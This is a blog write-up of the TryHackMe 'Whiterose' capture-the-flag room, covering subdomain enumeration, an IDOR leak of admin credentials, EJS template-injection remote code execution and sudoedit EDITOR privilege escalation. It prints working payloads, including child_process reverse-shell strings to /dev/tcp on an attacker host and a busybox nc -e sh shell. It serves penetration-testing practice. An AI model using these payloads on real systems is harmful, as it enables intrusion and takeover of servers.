---
title: "Challenges: Whiterose: TryHackMe"
datePublished: Thu Aug 21 2025 20:20:32 GMT+0000 (Coordinated Universal Time)
cuid: cmeluj407000g02l1grn80b9q
slug: challenges-whiterose-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1755807426586/90be1762-888a-4a24-ab09-3f2ca3f4a42a.png
tags: tryhackme, rce, ctf-writeup, privilege-escalation, sudoedit

---

The Whiterose challenge on TryHackMe is inspired by the *Mr. Robot* episode *409 Conflict* and follows the theme of taking down the Deus Group. This room combines real-world web exploitation techniques with privilege escalation misconfigurations, making it a great exercise for practicing enumeration, exploiting IDOR vulnerabilities, abusing template engines for RCE, and finally escalating privileges through `sudoedit`. In this write-up, I’ll walk through my approach, the tools I used, the challenges I faced, and how I ultimately captured both the user and root flags.

# **Welcome to Whiterose**

This challenge is based on the Mr. Robot episode “409 Conflict”. Contains spoilers!

Go ahead and start the machine**, it may take a few minutes to fully start up.**

And oh! I almost forgot! — You will need these: `Olivia Cortez:olivi8`

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/0*CJesOfuvCm3mJW7T.png align="left")

***Can you take down the Deus group?***

# **Answer the questions below**

At first, I tried running ***nmap*** and ***gobuster*** using the IP Address, but couldn’t see anything visiting the site using the ***http://IP\_Address***, redirected to the site domain, which I added the site to ***/etc/hosts***. I tried using ***gobuster*** with different wordlists, but it only showed the index.html file, which wasn’t helpful.

`nmap -p- -sV IP_Address`

`gobuster dir -u <http://cyprusbank.thm> -w /usr/share/wordlists/dirb/common.txt`

`gobuster dir -u [<http://cyprusbank.thm>](<http://cyprusbank.thm/>) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html`

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*1ICVmS579HjX67lwZGZmqA.png align="left")

`gobuster vhost -u [<http://cyprusbank.thm>](<http://cyprusbank.thm/>) -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*uXBUyz8DDptMMjyFGegKzA.png align="left")

Eventually tried using ***ffuf*** and it revealed the admin domain and added it to ***nano /etc/hosts,*** then logged in using the credentials given in the description of the room.

`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u <http://cyprusbank.thm> -H "Host: FUZZ.cyprusbank.thm"`

On logging there was a list of recent transactions and accounts of different users, with the balances showing and phone numbers masked.

## **What’s Tyrell Wellick’s phone number?**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*ZUmwEtK8Ka99lEd0_pDdSw.png align="left")

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*PG7T3w88GQB0gyxAcj0rqA.png align="left")

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*ppk6Tgsp3TcEheQbW115Tw.png align="left")

On another page, there was an option to search users, and there was a settings page that showed we don’t have permission.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*IIewqM7ApSeE9-dKRkaLeg.png align="left")

The messages page had an option to leave a comment, and the interesting part it had an ID at the end, and I thought of IDOR

Together with chat pages, added a comment and it showed an id at the end of the page url trying to change the ID considering a chance of IDOR the number of messages been shown kept decreasing and puttin 0 as the id reveals a chat where a developer asked for admin privileges so that they can test and boom we’ve a password and user so the next step is to test it

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755806625554/cad3da0d-de5c-4ec1-be32-78733160e026.png align="center")

[  
](https://medium.com/tag/tryhackme?source=post_page-----8e5d2e0bff17---------------------------------------)`Gayle Bev:'p~]P@5!6;rs558:q’`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755806610469/0214e586-d0fd-4e63-8c86-eec3261afaf4.png align="center")

On logging in, I realized the admin had the privilege to create a new user and nothing much. I read through a couple of walkthroughs, and it suggested using Burp Suite’s repeater to find the vulnerability that would enable us to get the initial foothold. switched to Burp Suite, logged in and created a user, then checked Burp Suite once again and sent the raw to repeater, then started figuring out what changes to make, with the help of the writeup, I learned that removing the password brought up an error when sent, which reveals .ejs the Express.js’ Embedded JavaScript Templates which has a RCE(Remote Code Execution). I tried a couple of ways to manipulate the code in order to get initial access, but many didn’t work until I followed one write-up’s way

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755806562448/f2925974-e7c6-4606-9d6b-eabaff726ab7.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755806535403/04d8d5af-52c8-4436-8a06-6506cbbad657.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755806521262/0249458b-9bd2-4c6d-b3a5-c923ae717aa2.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755806505366/80e208ae-a737-4fba-9d06-235dc97342a8.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755806465970/514efb18-c52c-494c-8f1c-3d2fddf75994.png align="center")

```php
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
Content-Length: 52
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: <http://admin.cyprusbank.thm>
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: <http://admin.cyprusbank.thm/settings>
Accept-Encoding: gzip, deflate, br
Cookie: connect.sid=s%3ANga7kvkmkW2dDfc2MGkV18d5KEaPGU9c.1YwD4lrNjL7jVALuZA0eIqwxQrAOpqpGYHcly3naMy8
Connection: keep-alive

name=Garet+Bel&password=p%7E%5DP%405%216%3Brs558%3Aq
```

```php
HTTP/1.1 500 Internal Server Error
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 20 Aug 2025 08:34:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1665
Connection: keep-alive
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: /home/web/app/views/settings.ejs:14<br> &nbsp; &nbsp;12| &nbsp; &nbsp; &nbsp; &nbsp; &lt;div class=&quot;alert alert-info mb-3&quot;&gt;&lt;%= message %&gt;&lt;/div&gt;<br> &nbsp; &nbsp;13| &nbsp; &nbsp; &nbsp; &lt;% } %&gt;<br> &gt;&gt; 14| &nbsp; &nbsp; &nbsp; &lt;% if (password != -1) { %&gt;<br> &nbsp; &nbsp;15| &nbsp; &nbsp; &nbsp; &nbsp; &lt;div class=&quot;alert alert-success mb-3&quot;&gt;Password updated to &#39;&lt;%= password %&gt;&#39;&lt;/div&gt;<br> &nbsp; &nbsp;16| &nbsp; &nbsp; &nbsp; &lt;% } %&gt;<br> &nbsp; &nbsp;17| &nbsp; &nbsp; &nbsp; &lt;% if (typeof error != &#39;undefined&#39;) { %&gt;<br><br>password is not defined<br> &nbsp; &nbsp;at eval (&quot;/home/web/app/views/settings.ejs&quot;:27:8)<br> &nbsp; &nbsp;at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)<br> &nbsp; &nbsp;at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)<br> &nbsp; &nbsp;at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)<br> &nbsp; &nbsp;at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)<br> &nbsp; &nbsp;at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)<br> &nbsp; &nbsp;at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)<br> &nbsp; &nbsp;at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)<br> &nbsp; &nbsp;at /home/web/app/routes/settings.js:27:7<br> &nbsp; &nbsp;at processTicksAndRejections (node:internal/process/task_queues:96:5)</pre>
</body>
</html>

```

`<%= require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.30.160/4444 0>&1"') %>`

`<%= 7 * 7 %>`

`<%= require('child_process').execSync('id').toString() %>`

`&settings[view options][client]=<%- require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") %>`

This worked with a netcat listener on port 4444:

`nc -lvnp 4444`

`&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.10.30.160 4444 -e sh');s`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755805285299/6b1cf186-f1dc-40fd-aad6-e63be1cc2cd6.png align="center")

Once we received the connection received we used the following commands:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755804946077/34ccea7a-770d-490f-b141-99719a6885b9.png align="center")

`whoami`

`id`

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755804923882/297f6098-61f6-4afb-8209-f8e31b28b501.png align="center")

`find / -type f -name user.txt 2>/dev/null`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755804906691/20464de8-2366-4a95-93fd-b82ed43f86cd.png align="center")

After getting the user flag, the next step was privilege escalation to root. I tried to check `sudo -l` and it revealed the `sudoedit`, but I couldn't do much with it individually. 

```bash
sudo -l
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
web@cyprusbank:~$ 
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755806365695/f9d024b8-a1ad-4a7c-9a16-dab6198d69de.png align="center")

I tried following a couple of writeups and research with ChatGPT trying but wasn't successful, especially with exporting the EDITOR with nano or vim. 

`export EDITOR="vim -- /etc/sudoers"`

`export EDITOR="nano -- /etc/sudoers"`

But came across a [walkthrough on YouTube](https://www.youtube.com/watch?v=xCJPrQ4OTzU) that explained what sudoedit does and a simple way of adding nano to the editor to reveal the content on the root.txt file, which has our flag, using the steps below:

`export EDITOR="nano -- /root/root.txt"`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755806689191/afe75de2-fa33-4c8b-9307-e8243550b180.png align="center")

`sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1755805767327/d7958b2b-7058-4394-80ef-820de544c02c.png align="center")

> ## Why This Worked
> 
> This is a classic privilege escalation vulnerability due to a misconfigured sudo permission and the behavior of sudoedit. Let’s dive into why this exploit works:
> 
> ### 1\. How sudoedit Works
> 
> * sudoedit (or sudo -e) is a special mode of sudo that allows a user to edit a file with root privileges using an editor specified by the EDITOR or VISUAL environment variable.
>     
> * When you run sudoedit /path, it:
>     
>     1. Creates a temporary copy of the file (/path) that the user is allowed to edit.
>         
>     2. Opens the editor (e.g., nano, vim) specified in the EDITOR variable to edit that temporary file.
>         
>     3. After editing, it copies the temporary file back to the original location (/path) with root privileges.
>         
> * Importantly, sudoedit runs the editor as the root user, meaning the editor itself has root-level access to the system.
>     
> 
> ### 2\. The EDITOR Variable Trick
> 
> * By setting EDITOR='nano -- /root/root.txt', you manipulated the editor command that sudoedit invokes. Instead of opening the intended file (/path), nano is tricked into opening /root/root.txt because of the -- argument.
>     
> * The -- in nano is used to treat subsequent arguments as filenames, bypassing any options parsing. So, nano -- /root/root.txt forces nano to open /root/root.txt directly.
>     
> * Since sudoedit runs the editor as root, nano has the necessary permissions to read /root/root.txt, which is otherwise inaccessible to the initial user.
>     
> 
> ### 3\. Why This Is a Vulnerability
> 
> * The misconfiguration lies in allowing the user to run sudoedit on a specific file (/path) without restricting the EDITOR variable. This allows the user to control the editor command and pass arbitrary arguments, effectively bypassing the intended file restriction.
>     
> * By exploiting this, you made sudoedit open a file (/root/root.txt) that the user wasn’t supposed to access, leveraging root privileges to read the flag.
>     
> 
> Key Takeaways
> 
> * Misconfiguration: Allowing sudoedit without locking down the EDITOR variable is a security flaw. A secure configuration would set a specific editor (e.g., /usr/bin/nano) in the sudoers file or restrict the EDITOR variable.
>     
> * Why It Worked: The sudoedit command ran nano as root, and you manipulated the EDITOR variable to make nano open the root-owned /root/root.txt file.
>     
> * Real-World Implication: This kind of vulnerability highlights the importance of carefully configuring sudo permissions and sanitizing environment variables like EDITOR to prevent privilege escalation.
>     
> 
> ## Example Breakdown
> 
> Here’s a simplified step-by-step of what happened:
> 
> 1. You checked sudo -l and saw (root) sudoedit /path.
>     
> 2. You set EDITOR='nano -- /root/root.txt' to make nano open /root/root.txt instead of /path.
>     
> 3. You ran sudoedit /path, which executed nano -- /root/root.txt as root.
>     
> 4. Since nano was running as root, it could read /root/root.txt, and you saw the flag.
>     
> 
> ### How to Prevent This (For System Admins)
> 
> * Use sudoedit with a specific editor in the sudoers file, e.g., Cmnd\_Alias EDIT = /usr/bin/nano /path.
>     
> * Disable the ability to override the EDITOR variable by setting env\_reset or env\_keep in the sudoers file to exclude EDITOR and VISUAL.
>     
> * Regularly audit sudoers configurations to ensure least privilege.
>     
> 
> ### If You’re Still Confused
> 
> Think of it like this: sudoedit is a tool that lets you edit a file as root, but it trusts the EDITOR variable to decide what program to use. By sneaking in a command like nano -- /root/root.txt, you hijacked the editor to open a different file, and since sudoedit runs as root, it happily opened the flag file for you.

### Resources

* ChatGPT
    

* GROK
    
    %[https://www.youtube.com/watch?v=xCJPrQ4OTzU] 
    
    %[https://medium.com/@alexmiminas/thm-whiterose-write-up-fbe6a2bf70af] 
    

%[https://infosecwriteups.com/whiterose-tryhackme-motion-graphics-writeup-easy-room-detailed-thm-walkthrough-972ee9129fe2] 

Whiterose was an engaging challenge that tied together multiple concepts — from basic enumeration with Nmap and Gobuster, to exploiting an IDOR for sensitive information, leveraging EJS template injection for remote code execution, and finally escalating privileges via a misconfigured `sudoedit`.

What I found most interesting was the privilege escalation trick using the `EDITOR` variable, which demonstrates how small misconfigurations in sudoers can lead to full system compromise. This room not only tested technical exploitation skills but also reinforced the importance of methodical enumeration and persistence.

Overall, Whiterose was a well-designed room that highlights realistic attack vectors and misconfigurations, making it a valuable learning experience for anyone sharpening their penetration testing skills.